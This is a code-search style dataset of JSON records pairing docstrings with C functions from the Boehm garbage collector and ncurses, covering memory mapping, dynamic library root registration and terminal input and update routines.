{"docstring": "/*\n * Apply fn to a buffer containing the contents of /proc/self/maps.\n * Return the result of fn or, if we failed, 0.\n * We currently do nothing to /proc/self/maps other than simply read\n * it.  This code could be simplified if we could determine its size\n * ahead of time.\n */\n", "func_signal": "word GC_apply_to_maps(word (*fn)(char *))", "code": "{\n    int f;\n    int result;\n    size_t maps_size = 4000;  /* Initial guess. \t*/\n    static char init_buf[1];\n    static char *maps_buf = init_buf;\n    static size_t maps_buf_sz = 1;\n\n    /* Read /proc/self/maps, growing maps_buf as necessary.\t*/\n        /* Note that we may not allocate conventionally, and\t*/\n        /* thus can't use stdio.\t\t\t\t*/\n\tdo {\n\t    if (maps_size >= maps_buf_sz) {\n\t      /* Grow only by powers of 2, since we leak \"too small\" buffers. */\n\t      while (maps_size >= maps_buf_sz) maps_buf_sz *= 2;\n\t      maps_buf = GC_scratch_alloc(maps_buf_sz);\n\t      if (maps_buf == 0) return 0;\n\t    }\n\t    f = open(\"/proc/self/maps\", O_RDONLY);\n\t    if (-1 == f) return 0;\n\t    maps_size = 0;\n\t    do {\n\t        result = GC_repeat_read(f, maps_buf, maps_buf_sz-1);\n\t        if (result <= 0) return 0;\n\t        maps_size += result;\n\t    } while (result == maps_buf_sz-1);\n\t    close(f);\n\t} while (maps_size >= maps_buf_sz);\n        maps_buf[maps_size] = '\\0';\n\t\n    /* Apply fn to result. */\n\treturn fn(maps_buf);\n}", "path": "boehmgc\\os_dep.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* Initialize virtual dirty bit implementation.\t\t\t*/\n", "func_signal": "void GC_dirty_init()", "code": "{\n#   ifdef PRINTSTATS\n      GC_printf0(\"Initializing DEFAULT_VDB...\\n\");\n#   endif\n    GC_dirty_maintained = TRUE;\n}", "path": "boehmgc\\os_dep.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* Two adjacent blocks have already been unmapped and are about to\t*/\n/* be merged.  Unmap the whole block.  This typically requires\t\t*/\n/* that we unmap a small section in the middle that was not previously\t*/\n/* unmapped due to alignment constraints.\t\t\t\t*/\n", "func_signal": "void GC_unmap_gap(ptr_t start1, word bytes1, ptr_t start2, word bytes2)", "code": "{\n    ptr_t start1_addr = GC_unmap_start(start1, bytes1);\n    ptr_t end1_addr = GC_unmap_end(start1, bytes1);\n    ptr_t start2_addr = GC_unmap_start(start2, bytes2);\n    ptr_t end2_addr = GC_unmap_end(start2, bytes2);\n    ptr_t start_addr = end1_addr;\n    ptr_t end_addr = start2_addr;\n    word len;\n    GC_ASSERT(start1 + bytes1 == start2);\n    if (0 == start1_addr) start_addr = GC_unmap_start(start1, bytes1 + bytes2);\n    if (0 == start2_addr) end_addr = GC_unmap_end(start1, bytes1 + bytes2);\n    if (0 == start_addr) return;\n    len = end_addr - start_addr;\n#   if defined(MSWIN32) || defined(MSWINCE)\n      while (len != 0) {\n          MEMORY_BASIC_INFORMATION mem_info;\n\t  GC_word free_len;\n\t  if (VirtualQuery(start_addr, &mem_info, sizeof(mem_info))\n\t      != sizeof(mem_info))\n\t      ABORT(\"Weird VirtualQuery result\");\n\t  free_len = (len < mem_info.RegionSize) ? len : mem_info.RegionSize;\n\t  if (!VirtualFree(start_addr, free_len, MEM_DECOMMIT))\n\t      ABORT(\"VirtualFree failed\");\n\t  GC_unmapped_bytes += free_len;\n\t  start_addr += free_len;\n\t  len -= free_len;\n      }\n#   else\n      if (len != 0 && munmap(start_addr, len) != 0) ABORT(\"munmap failed\");\n      GC_unmapped_bytes += len;\n#   endif\n}", "path": "boehmgc\\os_dep.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* This is a Windows NT derivative, i.e. NT, W2K, XP or later.  */\n", "func_signal": "void GC_init_win32()", "code": "{\n    /* if we're running under win32s, assume that no DLLs will be loaded */\n    DWORD v = GetVersion();\n    GC_wnt = !(v & 0x80000000);\n    GC_no_win32_dlls |= ((!GC_wnt) && (v & 0xff) <= 3);\n  }\n\n  /* Return the smallest address a such that VirtualQuery\t\t*/\n  /* returns correct results for all addresses between a and start.\t*/\n  /* Assumes VirtualQuery returns correct information for start.\t*/\n  ptr_t GC_least_described_address(ptr_t start)\n  {  \n    MEMORY_BASIC_INFORMATION buf;\n    DWORD result;\n    LPVOID limit;\n    ptr_t p;\n    LPVOID q;\n    \n    limit = GC_sysinfo.lpMinimumApplicationAddress;\n    p = (ptr_t)((word)start & ~(GC_page_size - 1));\n    for (;;) {\n    \tq = (LPVOID)(p - GC_page_size);\n    \tif ((ptr_t)q > (ptr_t)p /* underflow */ || q < limit) break;\n    \tresult = VirtualQuery(q, &buf, sizeof(buf));\n    \tif (result != sizeof(buf) || buf.AllocationBase == 0) break;\n    \tp = (ptr_t)(buf.AllocationBase);\n    }\n    return(p);\n  }\n# endif\n\n# ifndef REDIRECT_MALLOC\n  /* We maintain a linked list of AllocationBase values that we know\t*/\n  /* correspond to malloc heap sections.  Currently this is only called */\n  /* during a GC.  But there is some hope that for long running\t\t*/\n  /* programs we will eventually see most heap sections.\t\t*/\n\n  /* In the long run, it would be more reliable to occasionally walk \t*/\n  /* the malloc heap with HeapWalk on the default heap.  But that\t*/\n  /* apparently works only for NT-based Windows. \t\t\t*/ \n\n  /* In the long run, a better data structure would also be nice ...\t*/\n  struct GC_malloc_heap_list {\n    void * allocation_base;\n    struct GC_malloc_heap_list *next;\n  } *GC_malloc_heap_l = 0;\n\n  /* Is p the base of one of the malloc heap sections we already know\t*/\n  /* about?\t\t\t\t\t\t\t\t*/\n  GC_bool GC_is_malloc_heap_base(ptr_t p)\n  {\n    struct GC_malloc_heap_list *q = GC_malloc_heap_l;\n\n    while (0 != q) {\n      if (q -> allocation_base == p) return TRUE;\n      q = q -> next;\n    }\n    return FALSE;\n  }\n\n  void *GC_get_allocation_base(void *p)\n  {\n    MEMORY_BASIC_INFORMATION buf;\n    DWORD result = VirtualQuery(p, &buf, sizeof(buf));\n    if (result != sizeof(buf)) {\n      ABORT(\"Weird VirtualQuery result\");\n    }\n    return buf.AllocationBase;\n  }\n\n  size_t GC_max_root_size = 100000;\t/* Appr. largest root size.\t*/\n\n  void GC_add_current_malloc_heap()\n  {\n    struct GC_malloc_heap_list *new_l =\n                 malloc(sizeof(struct GC_malloc_heap_list));\n    void * candidate = GC_get_allocation_base(new_l);\n\n    if (new_l == 0) return;\n    if (GC_is_malloc_heap_base(candidate)) {\n      /* Try a little harder to find malloc heap.\t\t\t*/\n\tsize_t req_size = 10000;\n\tdo {\n\t  void *p = malloc(req_size);\n\t  if (0 == p) { free(new_l); return; }\n \t  candidate = GC_get_allocation_base(p);\n\t  free(p);\n\t  req_size *= 2;\n\t} while (GC_is_malloc_heap_base(candidate)\n\t         && req_size < GC_max_root_size/10 && req_size < 500000);\n\tif (GC_is_malloc_heap_base(candidate)) {\n\t  free(new_l); return;\n\t}\n    }\n#   ifdef CONDPRINT\n      if (GC_print_stats)\n\t  GC_printf1(\"Found new system malloc AllocationBase at 0x%lx\\n\",\n                     candidate);\n#   endif\n    new_l -> allocation_base = candidate;\n    new_l -> next = GC_malloc_heap_l;\n    GC_malloc_heap_l = new_l;\n  }\n# endif /* REDIRECT_MALLOC */\n  \n  /* Is p the start of either the malloc heap, or of one of our */\n  /* heap sections?\t\t\t\t\t\t*/\n  GC_bool GC_is_heap_base (ptr_t p)\n  {\n     \n     unsigned i;\n     \n#    ifndef REDIRECT_MALLOC\n       static word last_gc_no = -1;\n     \n       if (last_gc_no != GC_gc_no) {\n\t GC_add_current_malloc_heap();\n\t last_gc_no = GC_gc_no;\n       }\n       if (GC_root_size > GC_max_root_size) GC_max_root_size = GC_root_size;\n       if (GC_is_malloc_heap_base(p)) return TRUE;\n#    endif\n     for (i = 0; i < GC_n_heap_bases; i++) {\n         if (GC_heap_bases[i] == p) return TRUE;\n     }\n     return FALSE ;\n  }\n\n# ifdef MSWIN32\n  void GC_register_root_section(ptr_t static_root)\n  {\n      MEMORY_BASIC_INFORMATION buf;\n      DWORD result;\n      DWORD protect;\n      LPVOID p;\n      char * base;\n      char * limit, * new_limit;\n    \n      if (!GC_no_win32_dlls) return;\n      p = base = limit = GC_least_described_address(static_root);\n      while (p < GC_sysinfo.lpMaximumApplicationAddress) {\n        result = VirtualQuery(p, &buf, sizeof(buf));\n        if (result != sizeof(buf) || buf.AllocationBase == 0\n            || GC_is_heap_base(buf.AllocationBase)) break;\n        new_limit = (char *)p + buf.RegionSize;\n        protect = buf.Protect;\n        if (buf.State == MEM_COMMIT\n            && is_writable(protect)) {\n            if ((char *)p == limit) {\n                limit = new_limit;\n            } else {\n                if (base != limit) GC_add_roots_inner(base, limit, FALSE);\n                base = p;\n                limit = new_limit;\n            }\n        }\n        if (p > (LPVOID)new_limit /* overflow */) break;\n        p = (LPVOID)new_limit;\n      }\n      if (base != limit) GC_add_roots_inner(base, limit, FALSE);\n  }\n#endif\n  \n  void GC_register_data_segments()\n  {\n#     ifdef MSWIN32\n      static char dummy;\n      GC_register_root_section((ptr_t)(&dummy));\n#     endif\n  }\n\n# else /* !OS2 && !Windows */\n\n# if (defined(SVR4) || defined(AUX) || defined(DGUX) \\\n      || (defined(LINUX) && defined(SPARC))) && !defined(PCR)\nptr_t GC_SysVGetDataStart(max_page_size, etext_addr)\nint max_page_size;\nint * etext_addr;\n{\n    word text_end = ((word)(etext_addr) + sizeof(word) - 1)\n    \t\t    & ~(sizeof(word) - 1);\n    \t/* etext rounded to word boundary\t*/\n    word next_page = ((text_end + (word)max_page_size - 1)\n    \t\t      & ~((word)max_page_size - 1));\n    word page_offset = (text_end & ((word)max_page_size - 1));\n    VOLATILE char * result = (char *)(next_page + page_offset);\n    /* Note that this isnt equivalent to just adding\t\t*/\n    /* max_page_size to &etext if &etext is at a page boundary\t*/\n    \n    GC_setup_temporary_fault_handler();\n    if (SETJMP(GC_jmp_buf) == 0) {\n    \t/* Try writing to the address.\t*/\n    \t*result = *result;\n        GC_reset_fault_handler();\n    } else {\n        GC_reset_fault_handler();\n    \t/* We got here via a longjmp.  The address is not readable.\t*/\n    \t/* This is known to happen under Solaris 2.4 + gcc, which place\t*/\n    \t/* string constants in the text segment, but after etext.\t*/\n    \t/* Use plan B.  Note that we now know there is a gap between\t*/\n    \t/* text and data segments, so plan A bought us something.\t*/\n    \tresult = (char *)GC_find_limit((ptr_t)(DATAEND), FALSE);\n    }\n    return((ptr_t)result);\n}", "path": "boehmgc\\os_dep.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* Protected by GC lock. */\n", "func_signal": "void GC_begin_syscall()", "code": "{\n    if (!I_HOLD_LOCK()) {\n\tLOCK();\n\tsyscall_acquired_lock = TRUE;\n    }\n}", "path": "boehmgc\\os_dep.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* We assume that GC_remap is called on exactly the same range\t*/\n/* as a previous call to GC_unmap.  It is safe to consistently\t*/\n/* round the endpoints in both places.\t\t\t\t*/\n", "func_signal": "void GC_unmap(ptr_t start, word bytes)", "code": "{\n    ptr_t start_addr = GC_unmap_start(start, bytes);\n    ptr_t end_addr = GC_unmap_end(start, bytes);\n    word len = end_addr - start_addr;\n    if (0 == start_addr) return;\n#   if defined(MSWIN32) || defined(MSWINCE)\n      while (len != 0) {\n          MEMORY_BASIC_INFORMATION mem_info;\n\t  GC_word free_len;\n\t  if (VirtualQuery(start_addr, &mem_info, sizeof(mem_info))\n\t      != sizeof(mem_info))\n\t      ABORT(\"Weird VirtualQuery result\");\n\t  free_len = (len < mem_info.RegionSize) ? len : mem_info.RegionSize;\n\t  if (!VirtualFree(start_addr, free_len, MEM_DECOMMIT))\n\t      ABORT(\"VirtualFree failed\");\n\t  GC_unmapped_bytes += free_len;\n\t  start_addr += free_len;\n\t  len -= free_len;\n      }\n#   else\n      /* We immediately remap it to prevent an intervening mmap from\t*/\n      /* accidentally grabbing the same address space.\t\t\t*/\n      {\n\tvoid * result;\n        result = mmap(start_addr, len, PROT_NONE,\n\t\t      MAP_PRIVATE | MAP_FIXED | OPT_MAP_ANON,\n\t\t      zero_fd, 0/* offset */);\n        if (result != (void *)start_addr) ABORT(\"mmap(...PROT_NONE...) failed\");\n      }\n      GC_unmapped_bytes += len;\n#   endif\n}", "path": "boehmgc\\os_dep.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* This should never be called by a thread holding the lock */\n", "func_signal": "static void GC_dyld_image_remove(struct mach_header* hdr, unsigned long slide)", "code": "{\n    unsigned long start,end,i;\n    const struct section *sec;\n    for(i=0;i<sizeof(GC_dyld_sections)/sizeof(GC_dyld_sections[0]);i++) {\n        sec = getsectbynamefromheader(\n            hdr,GC_dyld_sections[i].seg,GC_dyld_sections[i].sect);\n        if(sec == NULL || sec->size == 0) continue;\n        start = slide + sec->addr;\n        end = start + sec->size;\n#\tifdef DARWIN_DEBUG\n            GC_printf4(\"Removing section at %p-%p (%lu bytes) from image %s\\n\",\n                start,end,sec->size,GC_dyld_name_for_hdr(hdr));\n#\t\tendif\n        GC_remove_roots((char*)start,(char*)end);\n    }\n#   ifdef DARWIN_DEBUG\n        GC_print_static_roots();\n#   endif\n}", "path": "boehmgc\\dyn_load.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* Repeatedly perform a read call until the buffer is filled or\t*/\n/* we encounter EOF.\t\t\t\t\t\t*/\n", "func_signal": "ssize_t GC_repeat_read(int fd, char *buf, size_t count)", "code": "{\n    ssize_t num_read = 0;\n    ssize_t result;\n    \n    while (num_read < count) {\n\tresult = READ(fd, buf + num_read, count - num_read);\n\tif (result < 0) return result;\n\tif (result == 0) break;\n\tnum_read += result;\n    }\n    return num_read;\n}", "path": "boehmgc\\os_dep.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* Compute a page aligned starting address for the unmap \t*/\n/* operation on a block of size bytes starting at start.\t*/\n/* Return 0 if the block is too small to make this feasible.\t*/\n", "func_signal": "ptr_t GC_unmap_start(ptr_t start, word bytes)", "code": "{\n    ptr_t result = start;\n    /* Round start to next page boundary.       */\n        result += GC_page_size - 1;\n        result = (ptr_t)((word)result & ~(GC_page_size - 1));\n    if (result + GC_page_size > start + bytes) return 0;\n    return result;\n}", "path": "boehmgc\\os_dep.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* Disable and enable signals during nontrivial allocations\t*/\n", "func_signal": "void GC_disable_signals(void)", "code": "{\n    ULONG nest;\n    \n    DosEnterMustComplete(&nest);\n    if (nest != 1) ABORT(\"nested GC_disable_signals\");\n}", "path": "boehmgc\\os_dep.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* From os_dep.c\t*/\n", "func_signal": "word GC_register_map_entries(char *maps)", "code": "{\n    char prot_buf[5];\n    char *buf_ptr = maps;\n    int count;\n    word start, end;\n    unsigned int maj_dev;\n    word least_ha, greatest_ha;\n    unsigned i;\n    word datastart = (word)(DATASTART);\n\n    /* Compute heap bounds. FIXME: Should be done by add_to_heap?\t*/\n\tleast_ha = (word)(-1);\n\tgreatest_ha = 0;\n\tfor (i = 0; i < GC_n_heap_sects; ++i) {\n\t    word sect_start = (word)GC_heap_sects[i].hs_start;\n\t    word sect_end = sect_start + GC_heap_sects[i].hs_bytes;\n\t    if (sect_start < least_ha) least_ha = sect_start;\n\t    if (sect_end > greatest_ha) greatest_ha = sect_end;\n        }\n    \tif (greatest_ha < (word)GC_scratch_last_end_ptr)\n\t    greatest_ha = (word)GC_scratch_last_end_ptr; \n\n    for (;;) {\n        buf_ptr = GC_parse_map_entry(buf_ptr, &start, &end, prot_buf, &maj_dev);\n\tif (buf_ptr == NULL) return 1;\n\tif (prot_buf[1] == 'w') {\n\t    /* This is a writable mapping.  Add it to\t\t*/\n\t    /* the root set unless it is already otherwise\t*/\n\t    /* accounted for.\t\t\t\t\t*/\n\t    if (start <= (word)GC_stackbottom && end >= (word)GC_stackbottom) {\n\t\t/* Stack mapping; discard\t*/\n\t\tcontinue;\n\t    }\n#\t    ifdef THREADS\n\t      if (GC_segment_is_thread_stack(start, end)) continue;\n#\t    endif\n\t    /* We no longer exclude the main data segment.\t\t*/\n\t    if (start < least_ha && end > least_ha) {\n\t\tend = least_ha;\n\t    }\n\t    if (start < greatest_ha && end > greatest_ha) {\n\t\tstart = greatest_ha;\n\t    }\n\t    if (start >= least_ha && end <= greatest_ha) continue;\n\t    GC_add_roots_inner((char *)start, (char *)end, TRUE);\n\t}\n    }\n    return 1;\n}", "path": "boehmgc\\dyn_load.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* !DARWIN */\n", "func_signal": "int GC_incremental_protection_needs()", "code": "{\n    if (GC_page_size == HBLKSIZE) {\n\treturn GC_PROTECTS_POINTER_HEAP;\n    } else {\n\treturn GC_PROTECTS_POINTER_HEAP | GC_PROTECTS_PTRFREE_HEAP;\n    }\n}", "path": "boehmgc\\os_dep.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* HBLKSIZE aligned.\t\t\t\t*/\n", "func_signal": "void GC_dirty_init()", "code": "{\n    GC_dirty_maintained = TRUE;\n    /* For the time being, we assume the heap generally grows up */\n    GC_vd_base = GC_heap_sects[0].hs_start;\n    if (GC_vd_base == 0) {\n   \tABORT(\"Bad initial heap segment\");\n    }\n    if (PCR_VD_Start(HBLKSIZE, GC_vd_base, NPAGES*HBLKSIZE)\n\t!= PCR_ERes_okay) {\n\tABORT(\"dirty bit initialization failed\");\n    }\n}", "path": "boehmgc\\os_dep.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* These should never be called, but just in case...  */\n", "func_signal": "kern_return_t catch_exception_raise_state(mach_port_name_t exception_port,\n    int exception, exception_data_t code, mach_msg_type_number_t codeCnt,\n    int flavor, thread_state_t old_state, int old_stateCnt,\n    thread_state_t new_state, int new_stateCnt)", "code": "{\n    ABORT(\"catch_exception_raise_state\");\n    return(KERN_INVALID_ARGUMENT);\n}", "path": "boehmgc\\os_dep.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* The _dyld_* functions have an internal lock so no _dyld functions\n   can be called while the world is stopped without the risk of a deadlock.\n   Because of this we MUST setup callbacks BEFORE we ever stop the world.\n   This should be called BEFORE any thread in created and WITHOUT the\n   allocation lock held. */\n", "func_signal": "void GC_init_dyld()", "code": "{\n  static GC_bool initialized = FALSE;\n  char *bind_fully_env = NULL;\n  \n  if(initialized) return;\n  \n#   ifdef DARWIN_DEBUG\n  GC_printf0(\"Registering dyld callbacks...\\n\");\n#   endif\n  \n  /* Apple's Documentation:\n     When you call _dyld_register_func_for_add_image, the dynamic linker runtime\n     calls the specified callback (func) once for each of the images that is\n     currently loaded into the program. When a new image is added to the program,\n     your callback is called again with the mach_header for the new image, and the \t\n     virtual memory slide amount of the new image. \n     \n     This WILL properly register already linked libraries and libraries \n     linked in the future\n  */\n  \n    _dyld_register_func_for_add_image(GC_dyld_image_add);\n    _dyld_register_func_for_remove_image(GC_dyld_image_remove);\n\n    /* Set this early to avoid reentrancy issues. */\n    initialized = TRUE;\n\n    bind_fully_env = getenv(\"DYLD_BIND_AT_LAUNCH\");\n    \n    if (bind_fully_env == NULL) {\n#   ifdef DARWIN_DEBUG\n      GC_printf0(\"Forcing full bind of GC code...\\n\");\n#   endif\n      \n      if(!_dyld_bind_fully_image_containing_address((unsigned long*)GC_malloc))\n        GC_abort(\"_dyld_bind_fully_image_containing_address failed\");\n    }\n\n}", "path": "boehmgc\\dyn_load.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* The following should ONLY be called when the world is stopped  */\n", "func_signal": "static void GC_mprotect_thread_notify(mach_msg_id_t id)", "code": "{\n    struct {\n        GC_msg_t msg;\n        mach_msg_trailer_t trailer;\n    } buf;\n    mach_msg_return_t r;\n    /* remote, local */\n    buf.msg.head.msgh_bits = \n        MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND,0);\n    buf.msg.head.msgh_size = sizeof(buf.msg);\n    buf.msg.head.msgh_remote_port = GC_ports.exception;\n    buf.msg.head.msgh_local_port = MACH_PORT_NULL;\n    buf.msg.head.msgh_id = id;\n            \n    r = mach_msg(\n        &buf.msg.head,\n        MACH_SEND_MSG|MACH_RCV_MSG|MACH_RCV_LARGE,\n        sizeof(buf.msg),\n        sizeof(buf),\n        GC_ports.reply,\n        MACH_MSG_TIMEOUT_NONE,\n        MACH_PORT_NULL);\n    if(r != MACH_MSG_SUCCESS)\n\tABORT(\"mach_msg failed in GC_mprotect_thread_notify\");\n    if(buf.msg.head.msgh_id != ID_ACK)\n        ABORT(\"invalid ack in GC_mprotect_thread_notify\");\n}", "path": "boehmgc\\os_dep.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* Compute end address for an unmap operation on the indicated\t*/\n/* block.\t\t\t\t\t\t\t*/\n", "func_signal": "ptr_t GC_unmap_end(ptr_t start, word bytes)", "code": "{\n    ptr_t end_addr = start + bytes;\n    end_addr = (ptr_t)((word)end_addr & ~(GC_page_size - 1));\n    return end_addr;\n}", "path": "boehmgc\\os_dep.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/* This should never be called by a thread holding the lock */\n", "func_signal": "static void GC_dyld_image_add(struct mach_header* hdr, unsigned long slide)", "code": "{\n    unsigned long start,end,i;\n    const struct section *sec;\n    if (GC_no_dls) return;\n    for(i=0;i<sizeof(GC_dyld_sections)/sizeof(GC_dyld_sections[0]);i++) {\n        sec = getsectbynamefromheader(\n            hdr,GC_dyld_sections[i].seg,GC_dyld_sections[i].sect);\n        if(sec == NULL || sec->size == 0) continue;\n        start = slide + sec->addr;\n        end = start + sec->size;\n#\tifdef DARWIN_DEBUG\n            GC_printf4(\"Adding section at %p-%p (%lu bytes) from image %s\\n\",\n                start,end,sec->size,GC_dyld_name_for_hdr(hdr));\n#       endif\n        GC_add_roots((char*)start,(char*)end);\n    }\n#   ifdef DARWIN_DEBUG\n        GC_print_static_roots();\n#   endif\n}", "path": "boehmgc\\dyn_load.c", "repo_name": "jatovm/jato", "stars": 150, "license": "other", "language": "c", "size": 17429}
{"docstring": "/*\n * Returns true if we allow application to use environment variables that are\n * used for searching lists of directories, etc.\n */\n", "func_signal": "NCURSES_EXPORT(int)\n_nc_env_access(void)", "code": "{\n#if HAVE_ISSETUGID\n    if (issetugid())\n\treturn FALSE;\n#elif HAVE_GETEUID && HAVE_GETEGID\n    if (getuid() != geteuid()\n\t|| getgid() != getegid())\n\treturn FALSE;\n#endif\n    return getuid() != 0 && geteuid() != 0;\t/* ...finally, disallow root */\n}", "path": "native\\tinfo\\access.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/*\n**      int\n**      kgetch()\n**\n**      Get an input character, but take care of keypad sequences, returning\n**      an appropriate code when one matches the input.  After each character\n**      is received, set an alarm call based on ESCDELAY.  If no more of the\n**      sequence is received by the time the alarm goes off, pass through\n**      the sequence gotten so far.\n**\n**\tThis function must be called when there are no cooked keys in queue.\n**\t(that is head==-1 || peek==head)\n**\n*/\n", "func_signal": "static int\nkgetch(SCREEN *sp EVENTLIST_2nd(_nc_eventlist * evl))", "code": "{\n    TRIES *ptr;\n    int ch = 0;\n    int timeleft = GetEscdelay(sp);\n\n    TR(TRACE_IEVENT, (\"kgetch() called\"));\n\n    ptr = sp->_keytry;\n\n    for (;;) {\n\tif (cooked_key_in_fifo() && sp->_fifo[head] >= KEY_MIN) {\n\t    break;\n\t} else if (!raw_key_in_fifo()) {\n\t    ch = fifo_push(sp EVENTLIST_2nd(evl));\n\t    if (ch == ERR) {\n\t\tpeek = head;\t/* the keys stay uninterpreted */\n\t\treturn ERR;\n\t    }\n#ifdef NCURSES_WGETCH_EVENTS\n\t    else if (ch == KEY_EVENT) {\n\t\tpeek = head;\t/* the keys stay uninterpreted */\n\t\treturn fifo_pull(sp);\t/* Remove KEY_EVENT from the queue */\n\t    }\n#endif\n\t}\n\n\tch = fifo_peek(sp);\n\tif (ch >= KEY_MIN) {\n\t    /* If not first in queue, somebody put this key there on purpose in\n\t     * emergency.  Consider it higher priority than the unfinished\n\t     * keysequence we are parsing.\n\t     */\n\t    peek = head;\n\t    /* assume the key is the last in fifo */\n\t    t_dec();\t\t/* remove the key */\n\t    return ch;\n\t}\n\n\tTR(TRACE_IEVENT, (\"ch: %s\", _nc_tracechar(sp, (unsigned char) ch)));\n\twhile ((ptr != NULL) && (ptr->ch != (unsigned char) ch))\n\t    ptr = ptr->sibling;\n\n\tif (ptr == NULL) {\n\t    TR(TRACE_IEVENT, (\"ptr is null\"));\n\t    break;\n\t}\n\tTR(TRACE_IEVENT, (\"ptr=%p, ch=%d, value=%d\",\n\t\t\t  (void *) ptr, ptr->ch, ptr->value));\n\n\tif (ptr->value != 0) {\t/* sequence terminated */\n\t    TR(TRACE_IEVENT, (\"end of sequence\"));\n\t    if (peek == tail)\n\t\tfifo_clear(sp);\n\t    else\n\t\thead = peek;\n\t    return (ptr->value);\n\t}\n\n\tptr = ptr->child;\n\n\tif (!raw_key_in_fifo()) {\n\t    int rc;\n\n\t    TR(TRACE_IEVENT, (\"waiting for rest of sequence\"));\n\t    rc = check_mouse_activity(sp, timeleft EVENTLIST_2nd(evl));\n#ifdef NCURSES_WGETCH_EVENTS\n\t    if (rc & TW_EVENT) {\n\t\tTR(TRACE_IEVENT, (\"interrupted by a user event\"));\n\t\t/* FIXME Should have preserved remainder timeleft for reuse... */\n\t\tpeek = head;\t/* Restart interpreting later */\n\t\treturn KEY_EVENT;\n\t    }\n#endif\n\t    if (!rc) {\n\t\tTR(TRACE_IEVENT, (\"ran out of time\"));\n\t\tbreak;\n\t    }\n\t}\n    }\n    ch = fifo_pull(sp);\n    peek = head;\n    return ch;\n}", "path": "native\\tinfo\\lib_getch.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/*\n**\tClrToEOL(blank)\n**\n**\tClear to end of current line, starting at the cursor position\n*/\n", "func_signal": "static void\nClrToEOL(NCURSES_SP_DCLx NCURSES_CH_T blank, bool needclear)", "code": "{\n    int j;\n\n    if (SP_PARM != 0) {\n\tif (CurScreen(SP_PARM) != 0\n\t    && SP_PARM->_cursrow >= 0) {\n\t    for (j = SP_PARM->_curscol; j < screen_columns(SP_PARM); j++) {\n\t\tif (j >= 0) {\n\t\t    NCURSES_CH_T *cp =\n\t\t    &(CurScreen(SP_PARM)->_line[SP_PARM->_cursrow].text[j]);\n\n\t\t    if (!CharEq(*cp, blank)) {\n\t\t\t*cp = blank;\n\t\t\tneedclear = TRUE;\n\t\t    }\n\t\t}\n\t    }\n\t}\n    }\n\n    if (needclear && (SP_PARM != 0)) {\n\tUpdateAttrs(SP_PARM, blank);\n\tTPUTS_TRACE(\"clr_eol\");\n\tif (clr_eol && SP_PARM->_el_cost <= (screen_columns(SP_PARM) - SP_PARM->_curscol)) {\n\t    NCURSES_SP_NAME(putp) (NCURSES_SP_ARGx clr_eol);\n\t} else {\n\t    int count = (screen_columns(SP_PARM) - SP_PARM->_curscol);\n\t    while (count-- > 0)\n\t\tPutChar(NCURSES_SP_ARGx CHREF(blank));\n\t}\n    }\n}", "path": "native\\tinfo\\tty_update.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
{"docstring": "/****************************************************************************\n *\n * Optimized update code\n *\n ****************************************************************************/\n", "func_signal": "static NCURSES_INLINE void\nGoTo(NCURSES_SP_DCLx int const row, int const col)", "code": "{\n    TR(TRACE_MOVE, (\"GoTo(%p, %d, %d) from (%d, %d)\",\n\t\t    (void *) SP_PARM, row, col, SP_PARM->_cursrow, SP_PARM->_curscol));\n\n    position_check(SP_PARM, SP_PARM->_cursrow, SP_PARM->_curscol, \"GoTo\");\n\n    TINFO_MVCUR(NCURSES_SP_ARGx\n\t\tSP_PARM->_cursrow,\n\t\tSP_PARM->_curscol,\n\t\trow, col);\n    position_check(SP_PARM, SP_PARM->_cursrow, SP_PARM->_curscol, \"GoTo2\");\n}", "path": "native\\tinfo\\tty_update.c", "repo_name": "zielmicha/emacs-android", "stars": 141, "license": "None", "language": "c", "size": 833}
